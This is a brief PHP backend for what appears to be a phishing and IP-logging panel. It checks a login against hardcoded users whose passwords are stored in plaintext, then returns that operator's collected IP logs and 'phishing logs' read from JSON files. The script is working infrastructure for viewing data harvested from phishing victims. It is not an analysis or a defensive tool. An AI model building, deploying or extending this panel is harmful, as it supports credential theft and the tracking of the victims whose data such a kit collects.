<?php
header('Content-Type: application/json');
$post = json_decode(file_get_contents('php://input'), true);
$users = [
    "yivex" => ["pass" => "yivexwtf", "code" => "yvx01"],
    "emirhan" => ["pass" => "yigitkraldırgerisiyalandır", "code" => "emr72"],
    "cancan" => ["pass" => "harbidensekermis", "code" => "can99"]
];

$u = $post['username']; $p = $post['password'];
if (isset($users[$u]) && $users[$u]['pass'] === $p) {
    $code = $users[$u]['code'];
    
    // Normal IP Logları
    $file = 'log_' . $code . '.json';
    $logs = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    
    // Phishing Logları
    $pFile = 'phish_' . $code . '.json';
    $pLogs = file_exists($pFile) ? json_decode(file_get_contents($pFile), true) : [];

    echo json_encode([
        "success" => true, 
        "userCode" => $code, 
        "logs" => $logs, 
        "p_logs" => $pLogs
    ]);
} else { echo json_encode(["success" => false]); }
?>